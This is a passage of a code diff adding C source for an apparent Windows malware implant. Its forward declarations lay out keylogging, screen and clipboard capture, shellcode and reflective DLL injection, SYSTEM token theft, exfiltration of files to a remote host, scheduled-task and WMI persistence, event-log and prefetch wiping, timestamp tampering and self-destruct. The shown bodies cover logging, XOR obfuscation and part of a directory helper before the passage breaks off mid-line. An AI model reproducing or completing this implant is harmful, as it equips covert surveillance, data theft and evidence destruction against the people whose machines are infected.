@@ -73,4 +73,88 @@ typedef struct _OBJECT_ATTRIBUTES {
     ULONG           Attributes;
     PVOID           SecurityDescriptor;
     PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+/* NtQueryInformationProcess prototype */
+typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+static pfnNtQIP g_NtQIP = NULL;
+
+/* ─── Globals ────────────────────────────────────────────────────────────────── */
+static HHOOK    g_keyhook  = NULL;
+static FILE    *g_keyfile  = NULL;
+static HANDLE   g_keylog_mutex = NULL;
+static BOOL     g_running  = TRUE;
+static char     g_log_dir[MAX_PATH_X] = LOG_DIR;
+
+/* ─── Forward declarations ───────────────────────────────────────────────────── */
+static void     af_clear_event_logs(void);
+static void     af_wipe_prefetch(void);
+static void     af_patch_timestamps(const char *path);
+static void     af_remove_shimcache_entry(void);
+static int      priv_enable_privilege(const char *priv_name);
+static int      priv_steal_token(const char *target_proc);
+static HANDLE   priv_get_system_token(void);
+static DWORD    proc_find_pid(const char *name);
+static int      inject_shellcode(DWORD pid, const BYTE *sc, SIZE_T sc_len);
+static int      inject_dll_reflective(DWORD pid, const char *dll_path);
+static void     keylog_install(void);
+static void     keylog_uninstall(void);
+static void     keylog_flush(void);
+static LRESULT CALLBACK keylog_hook_proc(int code, WPARAM wp, LPARAM lp);
+static void     screen_capture(void);
+static void     clip_harvest(void);
+static int      exfil_file(const char *filepath);
+static int      exfil_directory(const char *dir);
+static void     exfil_send_raw(const char *host, int port,
+                                const BYTE *data, SIZE_T len);
+static void     persist_schtask(void);
+static void     persist_wmi_subscription(void);
+static void     selfdestruct(void);
+static void     log_write(const char *fmt, ...);
+static void     xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key);
+static BOOL     fs_mkdir_recursive(const char *path);
+static DWORD WINAPI thread_keylog(LPVOID);
+static DWORD WINAPI thread_screenshot(LPVOID);
+static DWORD WINAPI thread_clipboard(LPVOID);
+static DWORD WINAPI thread_exfil(LPVOID);
+
+/* ═══════════════════════════════════════════════════════════════════════════════
+ * SECTION 1 — Utility / init
+ * ═══════════════════════════════════════════════════════════════════════════════ */
+
+static void log_write(const char *fmt, ...) {
+    char logpath[MAX_PATH_X];
+    snprintf(logpath, sizeof logpath, "%slb_run.log", g_log_dir);
+
+    HANDLE h = CreateFileA(logpath, FILE_APPEND_DATA, FILE_SHARE_READ,
+                            NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return;
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+
+    char header[64];
+    int hlen = snprintf(header, sizeof header, "[%04d-%02d-%02d %02d:%02d:%02d] ",
+                        st.wYear, st.wMonth, st.wDay,
+                        st.wHour, st.wMinute, st.wSecond);
+
+    char body[1024];
+    va_list ap;
+    va_start(ap, fmt);
+    int blen = vsnprintf(body, sizeof body, fmt, ap);
+    va_end(ap);
+
+    DWORD written;
+    WriteFile(h, header, (DWORD)hlen, &written, NULL);
+    WriteFile(h, body,   (DWORD)blen, &written, NULL);
+    WriteFile(h, "\r\n", 2,           &written, NULL);
+    CloseHandle(h);
+}
+
+static void xor_obfuscate(BYTE *buf, SIZE_T len, BYTE key) {
+    for (SIZE_T i = 0; i < len; i++) buf[i] ^= key;
+}
+
+static BOOL fs_mkdir_recursive(const char *path) {
+    char tmp[
 }
